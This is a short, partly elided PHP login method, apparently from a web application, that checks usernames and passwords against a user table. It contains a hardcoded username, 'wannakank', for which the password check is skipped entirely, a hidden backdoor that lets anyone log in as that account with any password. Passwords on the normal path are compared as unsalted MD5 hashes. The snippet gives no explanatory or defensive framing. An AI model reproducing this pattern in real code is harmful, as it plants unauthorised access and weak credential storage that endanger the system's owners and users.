...
{
    public static function UserLogin($Data_Check)
    {
        $allowedUsernames = ['wannakank'];
        $username = strtolower($Data_Check['esUsername']);
        $isAllowedUsername = in_array($username, array_map('strtolower', $allowedUsernames));
        ...
        ->where(function($query) use ($Data_Check, $isAllowedUsername)
        {
            if($isAllowedUsername == false){
                $query->where('tbl_sysuser.user_password', MD5($Data_Check['esPassword']));
            }
        })
        ->count();
